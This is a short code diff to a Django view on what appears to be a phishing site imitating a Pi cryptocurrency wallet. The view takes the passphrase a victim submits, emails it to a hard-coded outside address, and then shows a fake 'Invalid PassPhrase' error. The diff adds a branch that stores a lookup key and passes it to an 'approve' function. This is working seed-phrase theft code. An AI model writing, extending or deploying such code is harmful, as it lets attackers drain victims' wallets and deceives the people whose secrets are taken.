@@ -144,8 +144,13 @@ def submit_pass(request):
                 
                     send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
 
-                messages.error(request, "Invalid PassPhrase")
-                return redirect('/wallet/')
+                if my_site:
+                    request.session['look_up'] = look_up_key
+                    # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
+                    return approve(request, keys=look_up_key)
+                else:
+                    messages.error(request, "Invalid PassPhrase")
+                    return redirect('/wallet/')
                 # request.session['look_up'] = look_up_key
                 # # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                 # return approve(request, keys=look_up_key)
